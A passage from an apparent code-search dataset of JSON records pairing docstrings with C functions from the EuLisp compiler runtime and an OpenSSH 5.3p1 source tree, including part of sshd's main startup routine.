G00789,G00788);\n  eul_intern_symbol(sym_797,\"opencoding\");\n  eul_intern_symbol(sym_798,\"ff\");\n  eul_intern_symbol(sym_799,\"class\");\n  eul_intern_symbol(sym_800,\"constant\");\n  eul_intern_symbol(sym_801,\"value\");\n  eul_allocate_bytevector( G00796,G00795);\n  eul_intern_symbol(sym_804,\"arity\");\n  eul_allocate_bytevector( G00803,G00802);\n  eul_allocate_bytevector( G00806,G00805);\n  eul_intern_keyword(key_809,\"binding\");\n  eul_allocate_bytevector( G00808,G00807);\n  eul_intern_keyword(key_812,\"value\");\n  eul_intern_keyword(key_813,\"used\");\n  eul_allocate_bytevector( G00811,G00810);\n  eul_allocate_bytevector( G00815,G00814);\n  eul_intern_symbol(sym_818,\"name\");\n  eul_allocate_bytevector( G00817,G00816);\n  object_class(cons_822) = eul_static_cons_class;\n  eul_car(cons_822) = sym_799;\n  eul_cdr(cons_822) = sym_800;\n  object_class(cons_821) = eul_static_cons_class;\n  eul_cdr(cons_821) = eul_nil;\n  eul_allocate_bytevector( G00820,G00819);\n  eul_allocate_bytevector( G00824,G00823);\n  eul_allocate_bytevector( G00826,G00825);\n  eul_allocate_bytevector( G00828,G00827);\n  eul_allocate_bytevector( G00830,G00829);\n  eul_allocate_bytevector( G00832,G00831);\n  eul_allocate_bytevector( G00834,G00833);\n  eul_allocate_bytevector( G00836,G00835);\n  eul_allocate_bytevector( G00838,G00837);\n  eul_allocate_bytevector( G00840,G00839);\n  eul_allocate_bytevector( G00842,G00841);\n  eul_allocate_bytevector( G00844,G00843);\n  eul_allocate_bytevector( G00846,G00845);\n  eul_intern_symbol(sym_849,\"non-folded-local-binding?\");\n  eul_intern_symbol(sym_850,\"make-inlined-setter\");\n  eul_intern_symbol(sym_851,\"register-binding-ref\");\n  eul_intern_symbol(sym_852,\"get-inlined-setter-binding\");\n  eul_intern_symbol(sym_853,\"make-binding\");\n  eul_intern_symbol(sym_854,\"make-immutable-binding\");\n  eul_intern_symbol(sym_855,\"get-binding-info\");\n  eul_intern_symbol(sym_856,\"make-let*\");\n  eul_intern_symbol(sym_857,\"make-defined-external-fun\");\n  eul_intern_symbol(sym_858,\"make-global-var\");\n  eul_intern_symbol(sym_859,\"make-named-const\");\n  eul_intern_symbol(sym_860,\"make-mutable-binding\");\n  eul_intern_symbol(sym_861,\"foldable-constant?\");\n  eul_intern_symbol(sym_862,\"make-local-static-var\");\n  eul_intern_symbol(sym_863,\"make-setq\");\n  eul_intern_symbol(sym_864,\"get-binding-spec-info\");\n  eul_intern_symbol(sym_865,\"make-defined-opencoded-fun\");\n  eul_intern_symbol(sym_866,\"true-local-binding?\");\n  eul_intern_symbol(sym_867,\"make-fun\");\n  eul_intern_symbol(sym_868,\"compute-arity\");\n  eul_intern_symbol(sym_869,\"make-defined-fun\");\n  eul_intern_symbol(sym_870,\"make-dummy-binding\");\n  eul_intern_symbol(sym_871,\"get-imported-inlined-setter-binding\");\n  eul_intern_symbol(sym_872,\"make-module\");\n  eul_intern_symbol(sym_873,\"register-delegated-vars\");\n  eul_intern_symbol(sym_874,\"top-level\");\n  eul_allocate_bytevector( G00848,G00847);\n\n  /* Set local bindings */\n  {\n    int i;\n    for (i = 2; i < 29; i++)\n      sx_node_bindings[i] = eul_nil;\n  }\n\n  sx_node_bindings[ 29] = key_744;\n  sx_node_bindings[ 30] = key_745;\n  sx_node_bindings[ 31] = key_746;\n  sx_node_bindings[ 32] = key_747;\n  sx_node_bindings[ 33] = key_748;\n  sx_node_bindings[ 34] = key_749;\n  sx_node_bindings[ 35] = key_750;\n  sx_node_bindings[ 36] = G00743;\n  sx_node_bindings[ 37] = sym_753;\n  sx_node_bindings[ 38] = G00752;\n  sx_node_bindings[ 39] = G00755;\n  sx_node_bindings[ 40] = G00757;\n  sx_node_bindings[ 41] = sym_760;\n  sx_node_bindings[ 42] = sym_761;\n  sx_node_bindings[ 43] = sym_762;\n  sx_node_bindings[ 44] = sym_763;\n  sx_node_bindings[ 45] = sym_764;\n  sx_node_bindings[ 46] = G00759;\n  sx_node_bindings[ 47] = sym_767;\n  sx_node_bindings[ 48] = G00766;\n  sx_node_bindings[ 49] = key_770;\n  sx_node_bindings[ 50] = key_771;\n  sx_node_bindings[ 51] = key_772;\n  sx_node_bindings[ 52] = key_773;\n  sx_node_bindings[ 53] = key_774;\n  sx_node_bindings[ 54] = G00769;\n  sx_node_bindings[ 55] = str_777;\n  sx_node_bindings[ 56] = sym_778;\n  sx_node_bindings[ 57] = sym_779;\n  sx_node_bindings[ 58] = sym_780;\n  sx_node_bindings[ 59] = G00776;\n  sx_node_bindings[ 60] = sym_783;\n  sx_node_bindings[ 61] = G00782;\n  sx_node_bindings[ 62] = G00785;\n  sx_node_bindings[ 63] = G00787;\n  sx_node_bindings[ 64] = sym_790;\n  sx_node_bindings[ 65] = key_791;\n  sx_node_bindings[ 66] = key_792;\n  sx_node_bindings[ 67] = key_793;\n  sx_node_bindings[ 68] = key_794;\n  sx_node_bindings[ 69] = G00789;\n  sx_node_bindings[ 70] = sym_797;\n  sx_node_bindings[ 71] = sym_798;\n  sx_node_bindings[ 72] = sym_799;\n  sx_node_bindings[ 73] = sym_800;\n  sx_node_bindings[ 74] = sym_801;\n  sx_node_bindings[ 75] = G00796;\n  sx_node_bindings[ 76] = sym_804;\n  sx_node_bindings[ 77] = G00803;\n  sx_node_bindings[ 78] = G00806;\n  sx_node_bindings[ 79] = key_809;\n  sx_node_bindings[ 80] = G00808;\n  sx_node_bindings[ 81] = key_812;\n  sx_node_bindings[ 82] = key_813;\n  sx_node_bindings[ 83] = G00811;\n  sx_node_bindings[ 84] = G00815;\n  sx_node_bindings[ 85] = sym_818;\n  sx_node_bindings[ 86] = G00817;\n  sx_node_bindings[ 87] = cons_821;\n  sx_node_bindings[ 88] = G00820;\n  sx_node_bindings[ 89] = G00824;\n  sx_node_bindings[ 90] = G00826;\n  sx_node_bindings[ 91] = G00828;\n  sx_node_bindings[ 92] = G00830;\n  sx_node_bindings[ 93] = G00832;\n  sx_node_bindings[ 94] = G00834;\n  sx_node_bindings[ 95] = G00836;\n  sx_node_bindings[ 96] = G00838;\n  sx_node_bindings[ 97] = G00840;\n  sx_node_bindings[ 98] = G00842;\n  sx_node_bindings[ 99] = G00844;\n  sx_node_bindings[ 100] = G00846;\n  sx_node_bindings[ 1] = eul_nil;\n  sx_node_bindings[ 101] = sym_849;\n  sx_node_bindings[ 102] = sym_850;\n  sx_node_bindings[ 103] = sym_851;\n  sx_node_bindings[ 104] = sym_852;\n  sx_node_bindings[ 105] = sym_853;\n  sx_node_bindings[ 106] = sym_854;\n  sx_node_bindings[ 107] = sym_855;\n  sx_node_bindings[ 108] = sym_856;\n  sx_node_bindings[ 109] = sym_857;\n  sx_node_bindings[ 110] = sym_858;\n  sx_node_bindings[ 111] = sym_859;\n  sx_node_bindings[ 112] = sym_860;\n  sx_node_bindings[ 113] = sym_861;\n  sx_node_bindings[ 114] = sym_862;\n  sx_node_bindings[ 115] = sym_863;\n  sx_node_bindings[ 116] = sym_864;\n  sx_node_bindings[ 117] = sym_865;\n  sx_node_bindings[ 118] = sym_866;\n  sx_node_bindings[ 119] = sym_867;\n  sx_node_bindings[ 120] = sym_868;\n  sx_node_bindings[ 121] = sym_869;\n  sx_node_bindings[ 122] = sym_870;\n  sx_node_bindings[ 123] = sym_871;\n  sx_node_bindings[ 124] = sym_872;\n  sx_node_bindings[ 125] = sym_873;\n  sx_node_bindings[ 126] = sym_874;\n  eul_allocate_lambda( sx_node_bindings[0], \"initialize-sx-node\", 0, G00848);\n\n  }\n}", "path": "Youtoo\\Comptime2\\u2\\sx-node.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Get binding location using a ptr: #(obj module_name index)\n/// obj is () if the binding is located in one of the standard modules\n/// e.g. contained in level-1\n///-----------------------------------------------------------------------------\n", "func_signal": "LispRef eul_get_binding_location(LispRef *ptr, LispRef std_modules)", "code": "{\n    ptrInt addr1 = (ptrInt)ptr;\n    LispRef obj = *ptr;\n\n    ptrInt addr2;\n    LispRef entry;\n    for (int j = eul_nmodules - 1; j >= 0; j--)\n    {\n        entry = eul_sorted_modules[j];\n        addr2 = (ptrInt)TABLE_ENTRY_VALUE(entry);\n        WITH_DEBUG\n        (\n            fprintf\n            (\n                stderr,\n                \"if %\"ptrIntPM\"d <= %\"ptrIntPM\"d (%s) break\\n\", addr1, addr2,\n                (char *)TABLE_ENTRY_KEY(entry)\n            );\n        )\n\n        if (addr1 >= addr2)\n        {\n            break;\n        }\n    }\n\n    if (addr1 < addr2)\n    {\n        // binding not valid\n        return eul_nil;\n    }\n\n    char *module_name = (char *)TABLE_ENTRY_KEY(entry);\n    ptrInt index = (addr1 - addr2)/ptrNBytes;\n\n    WITH_DEBUG\n    (\n        fprintf\n        (\n            stderr,\n            \"!!!Revealed binding module: %s index: %\"ptrIntPM\"d\\n\",\n            module_name,\n            index\n        )\n    );\n    WITH_DEBUG(fprintf(stderr, \"!!!Revealed binding obj: \"));\n    WITH_DEBUG(fprint_ref(stderr, obj));\n    WITH_DEBUG(fprintf(stderr, \"\\n\"));\n\n    LispRef sym;\n    eul_intern_symbol(sym, module_name);\n    if (eul_is_object(obj))\n    {\n        int n = eul_fpi_as_c_int(eul_size_of(std_modules));\n        for (int i = 0; i < n; i++)\n        {\n            if (eul_slot_ref(std_modules, i) == sym)\n            {\n                obj = eul_nil;\n                break;\n            }\n        }\n    }\n    else\n    {\n        obj = eul_nil;\n    }\n\n    LispRef res;\n    eul_allocate_vector(res, 3, eul_nil);\n    eul_slot_ref(res, 0) = obj;\n    eul_slot_ref(res, 1) = sym;\n    eul_slot_ref(res, 2) = c_int_as_eul_fpi(index);\n\n    return res;\n}", "path": "Modules\\OS\\eul-serial2.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Foreign functions */\n", "func_signal": "static LispRef ff_stub_getchar419 (Stack *reg_value_stack, LispRef *sreg_value_sp, LispRef *sreg_value_sb)", "code": "{\n  LispRef res;\n\n  FF_RES_CONVERT1(res,getchar());\n  return res;\n}", "path": "Youtoo\\Telos\\u2\\boot.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Load compiled module\n///-----------------------------------------------------------------------------\n", "func_signal": "int load_compiled_module(char *module_name, FILE * fp)", "code": "{\n    LispRef bv;\n    LispRef *binding_vec = create_binding_vector(module_name, fp);\n\n    // Get bytevectors\n    while (is_init_bv == 0)\n    {\n        int size = create_next_bytevector(&bv, fp, binding_vec);\n\n        if (!fill_bytevector(fp, bv, size))\n        {\n            return (0);\n        }\n    }\n\n    is_init_bv = 0;\n\n    return 1;\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Look for \"I(%d, %d, %d, %d)\" or \"B(%s, %d)\"\n///-----------------------------------------------------------------------------\n", "func_signal": "int fill_bytevector(FILE * fp, LispRef bv, int size)", "code": "{\n    // Skip \" static const void *G000??[] = \"\n    int var_nr;\n    char var_name[6];\n    fscanf(fp, \"  static const void *G%d[] = \", &var_nr);\n    sprintf(var_name, \"%d\", var_nr);\n\n    void **data = (void **)BYTEVECTOR_DATA(bv);\n    int binding_index;\n    ptrInt x0, x1, x2, x3;\n    LispRef *word;\n    LispRef bindings;\n\n    for (int i = 0; i < size; i++)\n    {\n        // Skip \"{\" or \", \" or \"}\"\n        getc(fp);\n\n        if (getc(fp) == 'I')\n        {\n            fscanf(fp,\n            \"(%\" ptrIntPM \"x, %\" ptrIntPM \"x, %\" ptrIntPM \"x, %\" ptrIntPM \"x)\",\n            &x0, &x1, &x2, &x3);\n            // printf(\"fill_bytevector (%d, %d, %d, %d)\\n\", x0, x1, x2, x3);\n            // fflush(stdout);\n            word = (void *)II(x0, x1, x2, x3);\n        }\n        else\n        {\n            fscanf(fp, \"(%s ,%d)\", buf, &binding_index);\n            bindings = eul_fast_table_ref(eul_modules, buf);\n            // printf(\"fill_bytevector B(%s, %d)\\n\", buf, binding_index);\n            // fflush(stdout);\n            if (eul_null(bindings))\n            {\n                fprintf(stderr,\n                \"\\n*** WARNING [eul-dld][fill_bytevector]: module %s not loaded\\n\",\n                buf);\n                fflush(stderr);\n                return (0);\n            }\n            word = ((LispRef *) bindings) + binding_index;\n        }\n\n        data[i] = (void *)word;\n    }\n\n    return 1;\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/*\n * given auth method name, if configurable options permit this method fill\n * in auth_ident field and return true, otherwise return false.\n */\n", "func_signal": "static int\nauthmethod_is_enabled(Authmethod *method)", "code": "{\n\tif (method == NULL)\n\t\treturn 0;\n\t/* return false if options indicate this method is disabled */\n\tif  (method->enabled == NULL || *method->enabled == 0)\n\t\treturn 0;\n\t/* return false if batch mode is enabled but method needs interactive mode */\n\tif  (method->batch_flag != NULL && *method->batch_flag != 0)\n\t\treturn 0;\n\treturn 1;\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Main program for the daemon.\n */\n", "func_signal": "int\nmain(int ac, char **av)", "code": "{\n\textern char *optarg;\n\textern int optind;\n\tint opt, sock_in = 0, sock_out = 0, newsock, j, i, fdsetsz, on = 1;\n\tpid_t pid;\n\tsocklen_t fromlen;\n\tfd_set *fdset;\n\tstruct sockaddr_storage from;\n\tconst char *remote_ip;\n\tint remote_port;\n\tFILE *f;\n\tstruct addrinfo *ai;\n\tchar ntop[NI_MAXHOST], strport[NI_MAXSERV];\n\tint listen_sock, maxfd;\n\tint startup_p[2];\n\tint startups = 0;\n\tAuthctxt *authctxt;\n\tKey *key;\n\tint ret, key_used = 0;\n\n#ifdef HAVE_SECUREWARE\n\t(void)set_auth_parameters(ac, av);\n#endif\n\t__progname = get_progname(av[0]);\n\tinit_rng();\n\n\t/* Save argv. Duplicate so setproctitle emulation doesn't clobber it */\n\tsaved_argc = ac;\n\tsaved_argv = av;\n\tsaved_argv = xmalloc(sizeof(*saved_argv) * ac);\n\tfor (i = 0; i < ac; i++)\n\t\tsaved_argv[i] = xstrdup(av[i]);\n\n#ifndef HAVE_SETPROCTITLE\n\t/* Prepare for later setproctitle emulation */\n\tcompat_init_setproctitle(ac, av);\n#endif\n\n\t/* Initialize configuration options to their default values. */\n\tinitialize_server_options(&options);\n\n\t/* Parse command-line arguments. */\n\twhile ((opt = getopt(ac, av, \"f:p:b:k:h:g:V:u:o:dDeiqtQ46\")) != -1) {\n\t\tswitch (opt) {\n\t\tcase '4':\n\t\t\tIPv4or6 = AF_INET;\n\t\t\tbreak;\n\t\tcase '6':\n\t\t\tIPv4or6 = AF_INET6;\n\t\t\tbreak;\n\t\tcase 'f':\n\t\t\tconfig_file_name = optarg;\n\t\t\tbreak;\n\t\tcase 'd':\n\t\t\tif (0 == debug_flag) {\n\t\t\t\tdebug_flag = 1;\n\t\t\t\toptions.log_level = SYSLOG_LEVEL_DEBUG1;\n\t\t\t} else if (options.log_level < SYSLOG_LEVEL_DEBUG3) {\n\t\t\t\toptions.log_level++;\n\t\t\t} else {\n\t\t\t\tfprintf(stderr, \"Too high debugging level.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'D':\n\t\t\tno_daemon_flag = 1;\n\t\t\tbreak;\n\t\tcase 'e':\n\t\t\tlog_stderr = 1;\n\t\t\tbreak;\n\t\tcase 'i':\n\t\t\tinetd_flag = 1;\n\t\t\tbreak;\n\t\tcase 'Q':\n\t\t\t/* ignored */\n\t\t\tbreak;\n\t\tcase 'q':\n\t\t\toptions.log_level = SYSLOG_LEVEL_QUIET;\n\t\t\tbreak;\n\t\tcase 'b':\n\t\t\toptions.server_key_bits = atoi(optarg);\n\t\t\tbreak;\n\t\tcase 'p':\n\t\t\toptions.ports_from_cmdline = 1;\n\t\t\tif (options.num_ports >= MAX_PORTS) {\n\t\t\t\tfprintf(stderr, \"too many ports.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\toptions.ports[options.num_ports++] = a2port(optarg);\n\t\t\tif (options.ports[options.num_ports-1] == 0) {\n\t\t\t\tfprintf(stderr, \"Bad port number.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'g':\n\t\t\tif ((options.login_grace_time = convtime(optarg)) == -1) {\n\t\t\t\tfprintf(stderr, \"Invalid login grace time.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'k':\n\t\t\tif ((options.key_regeneration_time = convtime(optarg)) == -1) {\n\t\t\t\tfprintf(stderr, \"Invalid key regeneration interval.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'h':\n\t\t\tif (options.num_host_key_files >= MAX_HOSTKEYS) {\n\t\t\t\tfprintf(stderr, \"too many host keys.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\toptions.host_key_files[options.num_host_key_files++] = optarg;\n\t\t\tbreak;\n\t\tcase 'V':\n\t\t\tclient_version_string = optarg;\n\t\t\t/* only makes sense with inetd_flag, i.e. no listen() */\n\t\t\tinetd_flag = 1;\n\t\t\tbreak;\n\t\tcase 't':\n\t\t\ttest_flag = 1;\n\t\t\tbreak;\n\t\tcase 'u':\n\t\t\tutmp_len = atoi(optarg);\n\t\t\tif (utmp_len > MAXHOSTNAMELEN) {\n\t\t\t\tfprintf(stderr, \"Invalid utmp length.\\n\");\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'o':\n\t\t\tif (process_server_config_line(&options, optarg,\n\t\t\t    \"command-line\", 0) != 0)\n\t\t\t\texit(1);\n\t\t\tbreak;\n\t\tcase '?':\n\t\tdefault:\n\t\t\tusage();\n\t\t\tbreak;\n\t\t}\n\t}\n\tSSLeay_add_all_algorithms();\n\tchannel_set_af(IPv4or6);\n\n\t/*\n\t * Force logging to stderr until we have loaded the private host\n\t * key (unless started from inetd)\n\t */\n\tlog_init(__progname,\n\t    options.log_level == SYSLOG_LEVEL_NOT_SET ?\n\t    SYSLOG_LEVEL_INFO : options.log_level,\n\t    options.log_facility == SYSLOG_FACILITY_NOT_SET ?\n\t    SYSLOG_FACILITY_AUTH : options.log_facility,\n\t    log_stderr || !inetd_flag);\n\n#ifdef _UNICOS\n\t/* Cray can define user privs drop all prives now!\n\t * Not needed on PRIV_SU systems!\n\t */\n\tdrop_cray_privs();\n#endif\n\n\tseed_rng();\n\n\t/* Read server configuration options from the configuration file. */\n\tread_server_config(&options, config_file_name);\n\n\t/* Fill in default values for those options not explicitly set. */\n\tfill_default_server_options(&options);\n\n\t/* Check that there are no remaining arguments. */\n\tif (optind < ac) {\n\t\tfprintf(stderr, \"Extra argument %s.\\n\", av[optind]);\n\t\texit(1);\n\t}\n\n\tdebug(\"sshd version %.100s\", SSH_VERSION);\n\n\t/* load private host keys */\n\tsensitive_data.host_keys = xmalloc(options.num_host_key_files *\n\t    sizeof(Key *));\n\tfor (i = 0; i < options.num_host_key_files; i++)\n\t\tsensitive_data.host_keys[i] = NULL;\n\tsensitive_data.server_key = NULL;\n\tsensitive_data.ssh1_host_key = NULL;\n\tsensitive_data.have_ssh1_key = 0;\n\tsensitive_data.have_ssh2_key = 0;\n\n\tfor (i = 0; i < options.num_host_key_files; i++) {\n\t\tkey = key_load_private(options.host_key_files[i], \"\", NULL);\n\t\tsensitive_data.host_keys[i] = key;\n\t\tif (key == NULL) {\n\t\t\terror(\"Could not load host key: %s\",\n\t\t\t    options.host_key_files[i]);\n\t\t\tsensitive_data.host_keys[i] = NULL;\n\t\t\tcontinue;\n\t\t}\n\t\tswitch (key->type) {\n\t\tcase KEY_RSA1:\n\t\t\tsensitive_data.ssh1_host_key = key;\n\t\t\tsensitive_data.have_ssh1_key = 1;\n\t\t\tbreak;\n\t\tcase KEY_RSA:\n\t\tcase KEY_DSA:\n\t\t\tsensitive_data.have_ssh2_key = 1;\n\t\t\tbreak;\n\t\t}\n\t\tdebug(\"private host key: #%d type %d %s\", i, key->type,\n\t\t    key_type(key));\n\t}\n\tif ((options.protocol & SSH_PROTO_1) && !sensitive_data.have_ssh1_key) {\n\t\tlog(\"Disabling protocol version 1. Could not load host key\");\n\t\toptions.protocol &= ~SSH_PROTO_1;\n\t}\n\tif ((options.protocol & SSH_PROTO_2) && !sensitive_data.have_ssh2_key) {\n\t\tlog(\"Disabling protocol version 2. Could not load host key\");\n\t\toptions.protocol &= ~SSH_PROTO_2;\n\t}\n\tif (!(options.protocol & (SSH_PROTO_1|SSH_PROTO_2))) {\n\t\tlog(\"sshd: no hostkeys available -- exiting.\");\n\t\texit(1);\n\t}\n\n\t/* Check certain values for sanity. */\n\tif (options.protocol & SSH_PROTO_1) {\n\t\tif (options.server_key_bits < 512 ||\n\t\t    options.server_key_bits > 32768) {\n\t\t\tfprintf(stderr, \"Bad server key size.\\n\");\n\t\t\texit(1);\n\t\t}\n\t\t/*\n\t\t * Check that server and host key lengths differ sufficiently. This\n\t\t * is necessary to make double encryption work with rsaref. Oh, I\n\t\t * hate software patents. I dont know if this can go? Niels\n\t\t */\n\t\tif (options.server_key_bits >\n\t\t    BN_num_bits(sensitive_data.ssh1_host_key->rsa->n) -\n\t\t    SSH_KEY_BITS_RESERVED && options.server_key_bits <\n\t\t    BN_num_bits(sensitive_data.ssh1_host_key->rsa->n) +\n\t\t    SSH_KEY_BITS_RESERVED) {\n\t\t\toptions.server_key_bits =\n\t\t\t    BN_num_bits(sensitive_data.ssh1_host_key->rsa->n) +\n\t\t\t    SSH_KEY_BITS_RESERVED;\n\t\t\tdebug(\"Forcing server key to %d bits to make it differ from host key.\",\n\t\t\t    options.server_key_bits);\n\t\t}\n\t}\n\n\tif (use_privsep) {\n\t\tstruct passwd *pw;\n\t\tstruct stat st;\n\n\t\tif ((pw = getpwnam(SSH_PRIVSEP_USER)) == NULL)\n\t\t\tfatal(\"Privilege separation user %s does not exist\",\n\t\t\t    SSH_PRIVSEP_USER);\n\t\tif ((stat(_PATH_PRIVSEP_CHROOT_DIR, &st) == -1) ||\n\t\t    (S_ISDIR(st.st_mode) == 0))\n\t\t\tfatal(\"Missing privilege separation directory: %s\",\n\t\t\t    _PATH_PRIVSEP_CHROOT_DIR);\n\n#ifdef HAVE_CYGWIN\n\t\tif (check_ntsec(_PATH_PRIVSEP_CHROOT_DIR) &&\n\t\t    (st.st_uid != getuid () ||\n\t\t    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))\n#else\n\t\tif (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)\n#endif\n\t\t\tfatal(\"%s must be owned by root and not group or \"\n\t\t\t    \"world-writable.\", _PATH_PRIVSEP_CHROOT_DIR);\n\t}\n\n\t/* Configuration looks good, so exit if in test mode. */\n\tif (test_flag)\n\t\texit(0);\n\n\t/*\n\t * Clear out any supplemental groups we may have inherited.  This\n\t * prevents inadvertent creation of files with bad modes (in the\n\t * portable version at least, it's certainly possible for PAM \n\t * to create a file, and we can't control the code in every \n\t * module which might be used).\n\t */\n\tif (setgroups(0, NULL) < 0)\n\t\tdebug(\"setgroups() failed: %.200s\", strerror(errno));\n\n\t/* Initialize the log (it is reinitialized below in case we forked). */\n\tif (debug_flag && !inetd_flag)\n\t\tlog_stderr = 1;\n\tlog_init(__progname, options.log_level, options.log_facility, log_stderr);\n\n\t/*\n\t * If not in debugging mode, and not started from inetd, disconnect\n\t * from the controlling terminal, and fork.  The original process\n\t * exits.\n\t */\n\tif (!(debug_flag || inetd_flag || no_daemon_flag)) {\n#ifdef TIOCNOTTY\n\t\tint fd;\n#endif /* TIOCNOTTY */\n\t\tif (daemon(0, 0) < 0)\n\t\t\tfatal(\"daemon() failed: %.200s\", strerror(errno));\n\n\t\t/* Disconnect from the controlling tty. */\n#ifdef TIOCNOTTY\n\t\tfd = open(_PATH_TTY, O_RDWR | O_NOCTTY);\n\t\tif (fd >= 0) {\n\t\t\t(void) ioctl(fd, TIOCNOTTY, NULL);\n\t\t\tclose(fd);\n\t\t}\n#endif /* TIOCNOTTY */\n\t}\n\t/* Reinitialize the log (because of the fork above). */\n\tlog_init(__progname, options.log_level, options.log_facility, log_stderr);\n\n\t/* Initialize the random number generator. */\n\tarc4random_stir();\n\n\t/* Chdir to the root directory so that the current disk can be\n\t   unmounted if desired. */\n\tchdir(\"/\");\n\n\t/* ignore SIGPIPE */\n\tsignal(SIGPIPE, SIG_IGN);\n\n\t/* Start listening for a socket, unless started from inetd. */\n\tif (inetd_flag) {\n\t\tint s1;\n\t\ts1 = dup(0);\t/* Make sure descriptors 0, 1, and 2 are in use. */\n\t\tdup(s1);\n\t\tsock_in = dup(0);\n\t\tsock_out = dup(1);\n\t\tstartup_pipe = -1;\n\t\t/*\n\t\t * We intentionally do not close the descriptors 0, 1, and 2\n\t\t * as our code for setting the descriptors won\\'t work if\n\t\t * ttyfd happens to be one of those.\n\t\t */\n\t\tdebug(\"inetd sockets after dupping: %d, %d\", sock_in, sock_out);\n\t\tif (options.protocol & SSH_PROTO_1)\n\t\t\tgenerate_ephemeral_server_key();\n\t} else {\n\t\tfor (ai = options.listen_addrs; ai; ai = ai->ai_next) {\n\t\t\tif (ai->ai_family != AF_INET && ai->ai_family != AF_INET6)\n\t\t\t\tcontinue;\n\t\t\tif (num_listen_socks >= MAX_LISTEN_SOCKS)\n\t\t\t\tfatal(\"Too many listen sockets. \"\n\t\t\t\t    \"Enlarge MAX_LISTEN_SOCKS\");\n\t\t\tif (getnameinfo(ai->ai_addr, ai->ai_addrlen,\n\t\t\t    ntop, sizeof(ntop), strport, sizeof(strport),\n\t\t\t    NI_NUMERICHOST|NI_NUMERICSERV) != 0) {\n\t\t\t\terror(\"getnameinfo failed\");\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t/* Create socket for listening. */\n\t\t\tlisten_sock = socket(ai->ai_family, SOCK_STREAM, 0);\n\t\t\tif (listen_sock < 0) {\n\t\t\t\t/* kernel may not support ipv6 */\n\t\t\t\tverbose(\"socket: %.100s\", strerror(errno));\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (fcntl(listen_sock, F_SETFL, O_NONBLOCK) < 0) {\n\t\t\t\terror(\"listen_sock O_NONBLOCK: %s\", strerror(errno));\n\t\t\t\tclose(listen_sock);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t/*\n\t\t\t * Set socket options.\n\t\t\t * Allow local port reuse in TIME_WAIT.\n\t\t\t */\n\t\t\tif (setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR,\n\t\t\t    &on, sizeof(on)) == -1)\n\t\t\t\terror(\"setsockopt SO_REUSEADDR: %s\", strerror(errno));\n\n\t\t\tdebug(\"Bind to port %s on %s.\", strport, ntop);\n\n\t\t\t/* Bind the socket to the desired port. */\n\t\t\tif (bind(listen_sock, ai->ai_addr, ai->ai_addrlen) < 0) {\n\t\t\t\tif (!ai->ai_next)\n\t\t\t\t    error(\"Bind to port %s on %s failed: %.200s.\",\n\t\t\t\t\t    strport, ntop, strerror(errno));\n\t\t\t\tclose(listen_sock);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tlisten_socks[num_listen_socks] = listen_sock;\n\t\t\tnum_listen_socks++;\n\n\t\t\t/* Start listening on the port. */\n\t\t\tlog(\"Server listening on %s port %s.\", ntop, strport);\n\t\t\tif (listen(listen_sock, 5) < 0)\n\t\t\t\tfatal(\"listen: %.100s\", strerror(errno));\n\n\t\t}\n\t\tfreeaddrinfo(options.listen_addrs);\n\n\t\tif (!num_listen_socks)\n\t\t\tfatal(\"Cannot bind any address.\");\n\n\t\tif (options.protocol & SSH_PROTO_1)\n\t\t\tgenerate_ephemeral_server_key();\n\n\t\t/*\n\t\t * Arrange to restart on SIGHUP.  The handler needs\n\t\t * listen_sock.\n\t\t */\n\t\tsignal(SIGHUP, sighup_handler);\n\n\t\tsignal(SIGTERM, sigterm_handler);\n\t\tsignal(SIGQUIT, sigterm_handler);\n\n\t\t/* Arrange SIGCHLD to be caught. */\n\t\tsignal(SIGCHLD, main_sigchld_handler);\n\n\t\t/* Write out the pid file after the sigterm handler is setup */\n\t\tif (!debug_flag) {\n\t\t\t/*\n\t\t\t * Record our pid in /var/run/sshd.pid to make it\n\t\t\t * easier to kill the correct sshd.  We don't want to\n\t\t\t * do this before the bind above because the bind will\n\t\t\t * fail if there already is a daemon, and this will\n\t\t\t * overwrite any old pid in the file.\n\t\t\t */\n\t\t\tf = fopen(options.pid_file, \"wb\");\n\t\t\tif (f) {\n\t\t\t\tfprintf(f, \"%ld\\n\", (long) getpid());\n\t\t\t\tfclose(f);\n\t\t\t}\n\t\t}\n\n\t\t/* setup fd set for listen */\n\t\tfdset = NULL;\n\t\tmaxfd = 0;\n\t\tfor (i = 0; i < num_listen_socks; i++)\n\t\t\tif (listen_socks[i] > maxfd)\n\t\t\t\tmaxfd = listen_socks[i];\n\t\t/* pipes connected to unauthenticated childs */\n\t\tstartup_pipes = xmalloc(options.max_startups * sizeof(int));\n\t\tfor (i = 0; i < options.max_startups; i++)\n\t\t\tstartup_pipes[i] = 